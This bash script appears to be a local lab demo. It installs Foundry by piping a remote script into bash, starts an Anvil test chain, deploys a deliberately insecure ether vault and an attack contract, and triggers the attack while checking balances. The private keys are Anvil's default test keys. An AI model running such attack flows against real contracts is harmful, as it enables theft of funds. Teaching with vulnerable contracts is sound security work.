#!/usr/bin/bash

curl -L https://foundry.paradigm.xyz | bash
foundryup

gnome-terminal -- /usr/bin/bash -c "anvil -p 9319" &       #choosing a random port (8545 didn't work on personal system)
terminal_pid=$!

forge create --rpc-url http://127.0.0.1:9319 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 src/ExampleVulnContract.sol:InsecureEtherVault
forge create --rpc-url http://127.0.0.1:9319 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 src/ExampleAttack.sol:Attack --constructor-args "0x5FbDB2315678afecb367f032d93F642f64180aa3"
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "deposit()" --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --from 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 --rpc-url http://127.0.0.1:9319 --value 100000000
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "deposit()" --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --from 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 --rpc-url http://127.0.0.1:9319 --value 100000000    #send money
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getBalance()"  --rpc-url http://127.0.0.1:9319 #check balance
cast send 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "attack()" --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --from 0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc --value 1000000000000000000 --rpc-url http://127.0.0.1:9319 #sending to attacker contract
cast call 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9 "getBalance()" --rpc-url http://127.0.0.1:9319 #check balance
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "withdrawAll()(uint256)" --rpc-url http://127.0.0.1:9319 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  #calling the withdraw function
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getBalance()"  --rpc-url http://127.0.0.1:9319 #check balance finally

sleep 60
kill $terminal_pid